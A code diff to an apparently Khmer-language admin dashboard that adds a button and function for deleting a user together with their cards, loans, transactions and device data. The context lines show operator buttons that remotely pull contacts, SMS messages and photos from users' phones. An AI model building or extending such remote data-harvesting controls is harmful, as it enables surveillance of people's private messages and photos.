@@ -1665,6 +1665,7 @@ async function renderDevices() {
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_contacts')">👥 Contacts</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_sms')">📨 Read SMS</button>
                   <button class="btn ghost sm" onclick="sendDeviceCmd(${d.id}, 'get_photos')">🖼️ Photos</button>
+                  <button class="btn ghost sm" onclick="deleteDevice(${d.id}, '${esc(d.name)}')" style="color:#ef4444;border-color:#ef4444;">🗑️ លុប</button>
                 </td>
               </tr>
             `).join('')}
@@ -1731,6 +1732,20 @@ window.sendDeviceCmd = async function(userId, cmdType) {
     renderDevices();
   } catch (e) {
     toast(`❌ ${e.message}`, true);
+  }
+};
+
+window.deleteDevice = async function(userId, userName) {
+  if (!confirm(`⚠️ តើអ្នកប្រាកដទេថាចង់លុបអ្នកប្រើ "${userName}"?\n\nសកម្មភាពនេះនឹងលុប:\n- គណនីអ្នកប្រើ\n- កាតទាំងអស់\n- ប្រតិបត្តិការទាំងអស់\n- កម្ចីទាំងអស់\n- Device commands និង locations\n\nមិនអាចត្រឡប់វិញបានទេ!`)) {
+    return;
+  }
+  
+  try {
+    await api(`/users/${userId}`, { method: 'DELETE' });
+    toast(`✅ បានលុបអ្នកប្រើ "${userName}" ដោយជោគជ័យ`);
+    renderDevices();
+  } catch (e) {
+    toast(`❌ កំហុស: ${e.message}`, true);
   }
 };
 
